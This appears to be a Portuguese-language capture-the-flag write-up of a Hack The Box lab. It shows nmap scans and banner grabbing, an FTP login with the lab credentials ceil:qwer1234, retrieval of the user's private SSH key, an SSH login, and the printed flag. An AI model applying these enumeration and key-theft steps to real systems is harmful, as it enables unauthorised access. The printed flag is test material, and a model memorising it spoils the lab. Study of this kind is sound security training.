## Alvo
- IP -> 10.129.180.52

## Objetivo
- Esse é um lab que fala da existência de um servidor DNS que devemos enumerar e achar a maior quantidade de informações possiveis para ser utilizado contra sua infraestrutura.
-  Enumere o servidor com cuidado e encontre o arquivo flag.txt. Envie o conteúdo deste arquivo como resposta.

## Ferramentas e scripts utilizados
- nmap
- nc ( netcat )
- ftp
- ssh

## Resultados obtidos
```
sudo nmap -sS 10.129.42.195                       
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-28 13:21 -0400
Nmap scan report for 10.129.42.195
Host is up (0.78s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
2121/tcp open  ccproxy-ftp

Nmap done: 1 IP address (1 host up) scanned in 9.86 seconds
```
Aqui vemos que a porta 53 contém o servidor DNS pelo qual fomos instruídos a enumerar e explorar. Vemos também a existência de um servidor ftp e ssh. E na porta 2121 vemos um ccproxy-ftp que ao utilizarmos nc vemos que se trata de um ProFTPD diferente da porta 21 visto que executei um outro nc nessa porta.
```
nc -nv -w 3 10.129.42.195 2121 
(UNKNOWN) [10.129.42.195] 2121 (iprop) open
220 ProFTPD Server (Ceil's FTP) [10.129.42.195]
```
``` 
nc -nv -w 3 10.129.42.195 21  
(UNKNOWN) [10.129.42.195] 21 (ftp) open
220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.42.195]
```
Vemos que no da porta 21 a gente recebe o FQDN desse ftp junto, pode ser útil para utilizar com um dig em cima do servidor dns @10.129.42.195 . 

--- 
```
sudo nmap -sV -sC 10.129.42.195
Nmap scan report for 10.129.42.195
Host is up (0.46s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.42.195]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Ceil's FTP) [10.129.42.195]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.99%I=7%D=8/28%Time=6A91C51F%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,9C,"220\x20ProFTPD\x20Server\x20\(ftp\.int\.inlanefreight\.htb
SF:\)\x20\[10\.129\.42\.195\]\r\n500\x20Invalid\x20command:\x20try\x20bein
SF:g\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20
SF:more\x20creative\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2121-TCP:V=7.99%I=7%D=8/28%Time=6A91C51F%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,8D,"220\x20ProFTPD\x20Server\x20\(Ceil's\x20FTP\)\x20\[10\.1
SF:29\.42\.195\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20
SF:creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creat
SF:ive\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 291.22 seconds
```
Aqui utilizamos os scripts padrões de cada porta junto da flag -sV para recuperar versões , vemos que o server de destino é um ubuntu, recuperamos os tipos de criptografia que o server ssh suporta , os banners dos serviços ssh com mensagens indicando uma configuração do lab para evitar enumerações fáceis pelo nmap.

---
```
ftp 10.129.42.195 21                                                                        
Connected to 10.129.42.195.
220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.42.195]
Name (10.129.42.195:kali): ceil
331 Password required for ceil
Password: 
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||50411|)
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp> ls
229 Entering Extended Passive Mode (|||62623|)
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp> list
?Invalid command.
ftp> status
Connected and logged into 10.129.42.195.
No proxy connection.
Gate ftp: off, server (none), port ftpgate.
Passive mode: on; fallback to active mode: on.
Mode: stream; Type: binary; Form: non-print; Structure: file.
Verbose: on; Bell: off; Prompting: on; Globbing: on.
Store unique: off; Receive unique: off.
Preserve modification times: on.
Case: off; CR stripping: on.
Ntrans: off.
Nmap: off.
Hash mark printing: off; Mark count: 1024; Progress bar: on.
Get transfer rate throttle: off; maximum: 0; increment 1024.
Put transfer rate throttle: off; maximum: 0; increment 1024.
Socket buffer sizes: send 0, receive 0.
Use of PORT cmds: on.
Use of EPSV/EPRT cmds for IPv4: on.
Use of EPSV/EPRT cmds for IPv6: on.
Command line editing: on.
Version: tnftp 20260211
ftp> debug
Debugging on (debug=1).
ftp> trace
Packet tracing on.
ftp> ls
ftp: setsockopt SO_DEBUG (ignored): Permission denied
---> EPSV
229 Entering Extended Passive Mode (|||10340|)
229 Entering Extended Passive Mode (|||10340|)
---> LIST
150 Opening ASCII mode data connection for file list
resized buf to bufsize 131072 using rcvbuf_size 0
226 Transfer complete
ftp> ls -R
ftp: setsockopt SO_DEBUG (ignored): Permission denied
---> EPSV
229 Entering Extended Passive Mode (|||24480|)
229 Entering Extended Passive Mode (|||24480|)
---> LIST -R
150 Opening ASCII mode data connection for file list
resized buf to bufsize 131072 using rcvbuf_size 0
226 Transfer complete
ftp> 
```
A seção citou credenciais que foram achadas , nisso pensei em logar no ftp com essas credenciais ceil:qwer1234 , pois foi dito também de chaves ssh , pensei poderem estar nesse servidor , mas depois que fui raciocinar o nome dito no nmap ao digitalizar o ftp 2121 , Ceil's ftp que é o mesmo nome de usuário pelo qual estou tentando logar. Nisso depois desse fracasso no ftp da porta 21 eu fui para o da porta 2121 que é do ceil.
```
ftp 10.129.42.195 2121
Connected to 10.129.42.195.
220 ProFTPD Server (Ceil's FTP) [10.129.42.195]
Name (10.129.42.195:kali): ceil
331 Password required for ceil
Password: 
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||17766|)
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp> status
Connected and logged into 10.129.42.195.
No proxy connection.
Gate ftp: off, server (none), port ftpgate.
Passive mode: on; fallback to active mode: on.
Mode: stream; Type: binary; Form: non-print; Structure: file.
Verbose: on; Bell: off; Prompting: on; Globbing: on.
Store unique: off; Receive unique: off.
Preserve modification times: on.
Case: off; CR stripping: on.
Ntrans: off.
Nmap: off.
Hash mark printing: off; Mark count: 1024; Progress bar: on.
Get transfer rate throttle: off; maximum: 0; increment 1024.
Put transfer rate throttle: off; maximum: 0; increment 1024.
Socket buffer sizes: send 0, receive 0.
Use of PORT cmds: on.
Use of EPSV/EPRT cmds for IPv4: on.
Use of EPSV/EPRT cmds for IPv6: on.
Command line editing: on.
Version: tnftp 20260211
ftp> debug
Debugging on (debug=1).
ftp> trace
Packet tracing on.
ftp> ls
ftp: setsockopt SO_DEBUG (ignored): Permission denied
---> EPSV
229 Entering Extended Passive Mode (|||40470|)
229 Entering Extended Passive Mode (|||40470|)
---> LIST
150 Opening ASCII mode data connection for file list
resized buf to bufsize 131072 using rcvbuf_size 0
226 Transfer complete
ftp> get .
local: . remote: .
---> TYPE I
200 Type set to I
---> SIZE .
550 .: not a regular file
ftp: setsockopt SO_DEBUG (ignored): Permission denied
---> EPSV
229 Entering Extended Passive Mode (|||16627|)
229 Entering Extended Passive Mode (|||16627|)
---> RETR .
550 .: Not a regular file
ftp> get /
local: / remote: /
ftp: Can't access `/': Permission denied
ftp> get ~/
local: /home/kali/ remote: ~/
---> SIZE ~/
550 ~/: not a regular file
ftp: setsockopt SO_DEBUG (ignored): Permission denied
---> EPSV
229 Entering Extended Passive Mode (|||10871|)
229 Entering Extended Passive Mode (|||10871|)
---> RETR ~/
550 ~/: Not a regular file
ftp> get ~/---> TYPE A
ftp: setsockopt SO_DEBUG (ignored): Permission denied
---> EPSV
---> NLST ~

450 ~: No such file or directory
ftp> get ~/ftp: setsockopt SO_DEBUG (ignored): Permission denied
---> EPSV
---> NLST ~

450 ~: No such file or directory
ftp> get ~/.ssh
local: /home/kali/.ssh remote: ~/.ssh
---> TYPE I
200 Type set to I
---> SIZE ~/.ssh
550 ~/.ssh: not a regular file
ftp: setsockopt SO_DEBUG (ignored): Permission denied
---> EPSV
229 Entering Extended Passive Mode (|||51683|)
229 Entering Extended Passive Mode (|||51683|)
---> RETR ~/.ssh
550 ~/.ssh: Not a regular file
ftp> get ~/.ssh/
local: /home/kali/.ssh/ remote: ~/.ssh/
---> SIZE ~/.ssh/
550 ~/.ssh/: not a regular file
ftp: setsockopt SO_DEBUG (ignored): Permission denied
---> EPSV
229 Entering Extended Passive Mode (|||25160|)
229 Entering Extended Passive Mode (|||25160|)
---> RETR ~/.ssh/
550 ~/.ssh/: Not a regular file
ftp> get ~/.ssh/id_rsa
local: ~/.ssh/id_rsa remote: ~/.ssh/id_rsa
ftp: Can't access `~/.ssh/id_rsa': No such file or directory
ftp> get .ssh/id_rsa
local: .ssh/id_rsa remote: .ssh/id_rsa
---> SIZE .ssh/id_rsa
213 3381
ftp: setsockopt SO_DEBUG (ignored): Permission denied
---> EPSV
229 Entering Extended Passive Mode (|||50169|)
229 Entering Extended Passive Mode (|||50169|)
---> RETR .ssh/id_rsa
150 Opening BINARY mode data connection for .ssh/id_rsa (3381 bytes)
resized buf to bufsize 131072 using rcvbuf_size 0
100% |*************************************************************************|  3381       10.60 KiB/s    00:00 ETA
226 Transfer complete
3381 bytes received in 00:00 (3.62 KiB/s)
---> MDTM .ssh/id_rsa
213 20211110054558
remotemodtime: parsed time `20211110054558' as 1636523158, Wed, 10 Nov 2021 00:45:58 -0500
```
Aqui entrei no ftp do ceil e novamente me deparei com o ls não funcionando , mas diferente do outro eu pensei agora em especificar o .ssh/id_rsa que é a chave privada do ceil , se eu tirasse alguma chave do outro server provavelmente não seria dele.
Nisso ao baixar essa id_rsa ela veio pra minha pasta ssh , sai do ftp e fiz os passos restantes para conexão com ssh.

---
```
(kali㉿kali)-[~/.ssh]
└─$ ls -alh      
total 24K
drwx------  3 kali kali 4.0K Aug 28 13:46 .
drwx------ 23 kali kali 4.0K Aug 28 13:48 ..
drwx------  2 kali kali 4.0K Aug 28 09:18 agent
-rw-rw-r--  1 kali kali 3.4K Nov 10  2021 id_rsa
-rw-------  1 kali kali 3.4K Aug 21 11:46 known_hosts
-rw-------  1 kali kali 2.6K Aug 21 11:46 known_hosts.old
                                                                                                                      
┌──(kali㉿kali)-[~/.ssh]
└─$ ssh -i id_rsa ceil@10.129.180.52 
^C
                                                                                                                      
┌──(kali㉿kali)-[~/.ssh]
└─$ ssh ceil@10.129.180.52          
The authenticity of host '10.129.180.52 (10.129.180.52)' can't be established.
ED25519 key fingerprint is: SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.180.52' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for '/home/kali/.ssh/id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "/home/kali/.ssh/id_rsa": bad permissions
ceil@10.129.180.52: Permission denied (publickey).
                                                                                                                      
┌──(kali㉿kali)-[~/.ssh]
└─$ ls     
agent  id_rsa  known_hosts  known_hosts.old
                                                                                                                      
┌──(kali㉿kali)-[~/.ssh]
└─$ ls -alh
total 24K
drwx------  3 kali kali 4.0K Aug 28 13:46 .
drwx------ 23 kali kali 4.0K Aug 28 13:48 ..
drwx------  2 kali kali 4.0K Aug 28 09:18 agent
-rw-rw-r--  1 kali kali 3.4K Nov 10  2021 id_rsa
-rw-------  1 kali kali 3.6K Aug 28 13:56 known_hosts
-rw-------  1 kali kali 2.6K Aug 21 11:46 known_hosts.old
                                                                                                                      
┌──(kali㉿kali)-[~/.ssh]
└─$ chmod 600 id_rsa
                                                                                                                      
┌──(kali㉿kali)-[~/.ssh]
└─$ ssh ceil@10.129.180.52
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 28 Aug 2026 05:56:56 PM UTC

  System load:  0.08              Processes:               177
  Usage of /:   86.3% of 3.87GB   Users logged in:         0
  Memory usage: 14%               IPv4 address for ens192: 10.129.180.52
  Swap usage:   0%

  => / is using 86.3% of 3.87GB

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

116 updates can be installed immediately.
1 of these updates is a security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
ceil@NIXEASY:~$ ls
ceil@NIXEASY:~$ pwd
/home/ceil
ceil@NIXEASY:~$ cd ..
ceil@NIXEASY:/home$ ls
ceil  cry0l1t3  flag
ceil@NIXEASY:/home$ cd flag/
ceil@NIXEASY:/home/flag$ ls
flag.txt
ceil@NIXEASY:/home/flag$ cat flag.txt 
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
ceil@NIXEASY:/home/flag$ 

```

## Considerações
Foi pedido para enumerar um servidor dns contendo certas informações , mas para conseguir a flag só foi preciso do restante das informações sobre o login e senha do ceil bem como a vendo que existia um servidor ftp 2121 rodando com nome de ceil's ftp , nisso ao ver que o ls não funcionava eu pensei no fato de que as chaves ssh ditas na seção estariam lá naquela pasta e dei um get cego em .ssh/id_rsa , na qual recuperei a chave.
Em seguida foi só preciso usar ela para conectar via ssh , ir para a pasta flag e pegar as infos dela.

*Tive de restaurar a máquina pois um comando meu travou o ftp , o ip de alguns comandos se diferem entre si e do cabeçalho devido a isso*


